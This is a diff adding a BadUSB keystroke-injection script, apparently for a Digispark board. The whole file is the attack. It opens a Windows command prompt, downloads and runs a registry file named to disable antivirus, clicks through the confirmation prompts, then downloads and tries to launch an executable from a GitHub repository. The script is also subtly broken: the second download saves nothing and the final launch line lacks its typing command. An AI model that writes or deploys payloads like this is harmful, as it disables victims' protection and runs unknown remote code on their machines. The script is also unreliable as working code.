@@ -1,0 +1,47 @@
+LED ON
+DELAY 500
+LED OFF
+DELAY 500
+LED ON
+DELAY 500
+LED OFF
+DELAY 500
+LED ON
+DELAY 500
+LED OFF
+DELAY 500
+LED ON
+DELAY 500
+LED OFF
+DELAY 500
+LED ON
+GUI R
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 700
+STRING curl -o desativar_antivirus.reg https://raw.githubusercontent.com/fezarosa-dev/DIGISPARK/main/desativar_antivirus.reg
+DELAY 500
+ENTER
+DELAY 5000
+STRING START desativar_antivirus.reg
+DELAY 500
+ENTER
+DELAY 500
+LEFT
+DELAY 100
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING curl https://github.com/fezarosa-dev/DIGISPARK/raw/main/main.exe
+DELAY 500
+ENTER
+DELAY 4000
+START main.exe
+DELAY 500
+ENTER
+LED OFF
